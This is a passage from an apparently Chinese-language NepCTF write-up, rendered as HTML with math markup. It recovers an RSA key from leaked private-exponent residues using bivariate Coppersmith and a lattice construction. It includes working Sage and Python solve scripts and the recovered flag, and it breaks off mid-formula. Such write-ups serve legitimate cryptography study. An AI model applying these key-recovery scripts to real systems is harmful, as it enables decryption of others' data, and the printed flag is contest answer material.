style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>这里是<code>k1,k2</code>未知(<code>p q</code>暂时不管)，很明显我们可以尝试一下<strong>二元copper</strong>，不过形式得稍微变换一下</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>−</mo><mn>1</mn><mo>−</mo><mi>k</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>N</mi><mo>−</mo><mi>p</mi><mo>−</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>≡</mo><mn>0</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>e</mi><mo>∗</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_{low}-1-k*(N-p-q+1)\equiv 0\ mod\ (e*M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>令</mtext><mi>X</mi><mo>=</mo><mi>k</mi><mo separator="true">,</mo><mi>Y</mi><mo>=</mo><mi>p</mi><mo>+</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">令X = k,Y=p+q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">令</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><p><code>k</code>可以借助题目脚本多跑几下，大概位数在<strong>676位</strong>，<code>p+q</code>很明显<strong>1024位</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(e*M))</span><br><span class="line">f = e*d_low -<span class="number">1</span> - x*(N - y + <span class="number">1</span>)</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">676</span>,<span class="number">2</span>^<span class="number">1024</span>),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p_q = <span class="subst">&#123;root[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里<code>Sage</code>不知道发什么癫，解方程有问题，换<code>Python</code>解一下吧，<code>Python</code>还得注意一下大整数才能运行起来</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pq = <span class="number">307418535695879466735463624869957924354358665052136409248678026715718383427120772212039629998693207855281708171850879171131527744317839878812415135610115774273232848128353184128891514282686549164628675031032302196224590402569695631086177519084924289711604045185861705566454491785664136393955640722211793934882</span></span><br><span class="line"></span><br><span class="line">p, q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">res = solve([p*q-N, pq - (p+q)], [p, q])</span><br><span class="line">p, q = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(p*q == N)</span><br><span class="line">e = Integer(e)</span><br><span class="line">p = Integer(p)</span><br><span class="line">d = inverse(e, p-<span class="number">1</span>)</span><br><span class="line">ct = Integer(ct)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(ct, d, p)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># NepCTF&#123;larg3r_M0du1u5_1nf0_g1ves_b3773r_b0und5&#125;</span></span><br></pre></td></tr></table></figure><p>这就是一个简单的<strong>二元copper</strong>的应用</p><h2 id="思路二"><a class="markdownIt-Anchor" href="#思路二"></a> 思路二</h2><p>这里也可以尝试<strong>构造格</strong></p><p>我们把需要求解的<code>p+q</code>放到等式右边<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>−</mo><mn>1</mn><mo>+</mo><mi>e</mi><mo>∗</mo><msub><mi>k</mi><mn>1</mn></msub><mo>∗</mo><mi>M</mi><mo>−</mo><msub><mi>k</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mi>N</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><msub><mi>k</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_{low}-1+e*k_{1}*M-k_{2}*(N+1)=k_{2}*(p+q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span><br />可以得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><msub><mi>k</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∗</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><msub><mi>d</mi><mrow><mi>l</mi><mi>o</mi><mi>w</mi></mrow></msub><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><mi>M</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>N</mi><mo>+</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \begin{matrix}1&amp;k_1&amp;-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}1&amp;0&amp;ed_{low}-1\\0&amp;1&amp;eM\\0&amp;0&amp;N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}1&amp;k_1&amp;k_{2}(p+q)\\\end{matrix} \right ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span 